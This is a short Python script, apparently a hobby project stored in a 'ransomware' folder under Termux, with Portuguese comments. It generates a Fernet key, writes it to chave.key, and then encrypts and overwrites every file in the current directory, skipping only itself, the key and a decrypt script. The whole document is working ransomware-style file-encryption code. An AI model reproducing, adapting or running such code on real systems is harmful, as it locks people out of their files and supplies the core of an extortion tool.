import os
from cryptography.fernet import Fernet

arquivos = []
caminho = '/data/data/com.termux/files/home/Python_No_Termux/ransomware/chave.key'

key = Fernet.generate_key()
with open (caminho, 'wb') as chave:
    chave.write(key)

#Colocando os arquivos na lista
for arquivo in os.listdir():
    if arquivo == 'encrypt.py' or arquivo == 'chave.key' or arquivo == 'decrypt.py':
        continue #que lindo :P

    if os.path.isfile(arquivo):
        arquivos.append(arquivo)

for arquivo in arquivos:
    with open (arquivo, 'rb') as file:
        conteudo = file.read()
    conteudo_encriptado = Fernet(key).encrypt(conteudo)
    with open (arquivo, 'wb') as file:
        file.write(conteudo_encriptado)
